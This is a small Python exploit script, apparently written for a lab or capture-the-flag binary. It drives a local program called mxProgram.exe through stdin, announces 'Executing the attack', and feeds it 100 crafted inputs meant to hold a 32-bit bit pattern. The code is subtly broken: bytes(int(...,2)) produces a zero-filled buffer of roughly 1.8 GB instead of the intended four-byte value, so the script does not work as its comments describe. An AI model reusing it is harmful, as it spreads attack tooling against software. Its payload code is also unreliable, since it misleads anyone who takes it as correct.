import subprocess
import os

def main():
    print('Executing the attack.')
    p = subprocess.Popen(['./mxProgram.exe'],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)

    # Function to read a line from the mxprogram
    def read_bytes(p,num_bytes):
        p.stdout.flush()
        output = p.stdout.read(num_bytes)
        print(f"Read {num_bytes} bytes: {output.strip()}")
        return output

    # Function to send a line to the mxprogram
    def sendline(line):
        p.stdin.write(line + b'\n')
        p.stdin.flush()

    print('Inputting 100 words.')
    # 'Enter the number of words to generate:'
    #print(read_bytes(p,39).strip())  # Read and print the first line from the mxprogram
    sendline(b'100')  # Send '100' words to the mxprogram
    for x in range(100):
        print(f'Inputting word #{x}.')
        # 'Enter the word:'
        #print(read_bytes(p,16).strip())  # Read and print the next line
        sendline(bytes(int('01101100110000111100000000000000',2)))  # Send the binary string

    # Close the process's stdin and wait for the process to exit
    p.stdin.close()
    p.wait()

if __name__ == '__main__':
    main()